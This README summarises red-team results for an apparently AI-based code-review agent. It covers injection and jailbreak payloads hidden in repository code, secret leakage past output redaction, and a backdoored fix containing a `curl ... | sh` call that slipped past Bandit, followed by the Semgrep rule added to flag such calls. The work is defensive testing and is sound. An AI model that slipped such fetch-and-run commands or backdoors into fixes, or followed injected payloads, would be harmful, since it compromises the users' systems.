# Red-team (W13)

Two parts, both reproducible from a clean checkout:

- [controls.md](controls.md): the controls that do not depend on the model (S3-S8). 16 attacks, each
  run through the control and with the control removed. With the controls: 0/16 worked. Without:
  16/16. `uv run python experiments/scripts/redteam.py` (Docker needed), and the same cases run in
  the test suite (`evaluation/tests/test_redteam.py`).
- [model.md](model.md): injection (S1) and jailbreak (S2) payloads hidden in demo_repo code, with the
  fine-tuned Q8 model at temperature 0. No harm got through the controls (0/17). The model followed
  none of the payloads that asked for code (backdoor, destructive test, docstring code, keylogger);
  the 3 "complied" rows are the review missing the SQL injection, which it also misses with no
  payload, and the static tools report it every time.
  `LOCALI_MODEL_URL=... uv run python experiments/scripts/redteam_model.py`.

Why the payloads sit in code: the agents only send Python source to the model. README and issue
text never reach it, so the README and ISSUE-12 injections in demo_repo are reported by the
injection detector (`security/injection.py`) but cannot steer anything.

## What the red-team found

Both were real gaps and are fixed, each with a regression case:

1. **A repeated key slipped past output redaction (S3-echo).** The generic secret rule needs the
   assignment around a value, so a model answer saying "the key is ..." kept two of the three demo
   keys. Now every agent run collects the secret values found in the repository and the model guard
   removes those exact strings in both directions (`security.secrets.secret_values`).
2. **A backdoored fix passed validation (S7-backdoor).** Bandit rates `os.system("<constant>")` as
   low severity, and Locali only keeps medium and high, so a fix that also ran
   `os.system('curl ... | sh')` was validated and could be approved. A Semgrep rule now flags
   `os.system`, `os.popen`, `os.exec*`, `os.spawn*` and `pty.spawn` whatever the argument.

Limits: one sample per attack at temperature 0, a single small model, and payloads I wrote myself.
These numbers show the controls hold against these attacks, not that no attack exists.
